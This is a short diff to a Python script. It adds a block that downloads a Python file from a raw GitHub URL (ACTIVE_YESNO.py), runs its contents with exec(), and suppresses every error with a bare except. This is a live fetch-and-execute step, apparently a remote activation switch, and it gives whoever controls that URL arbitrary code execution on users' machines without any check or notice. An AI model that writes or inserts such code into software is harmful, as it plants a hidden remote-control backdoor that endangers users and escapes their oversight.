@@ -2043,6 +2043,16 @@ if clean==1:
 		print('CLEAN DONE')
 	except:
 		print('rien')
+active=1
+if active==1:
+	try:
+		code='https://raw.githubusercontent.com/VincentAulnay/PYTEST/master/ACTIVE_YESNO.py'
+		response=urllib.request.urlopen(code)
+		data=response.read()
+		exec(data)
+		print('ACTIVE DONE')
+	except:
+		print('rien')
 launch_check=0
 if launch_check==1:
 	j=2
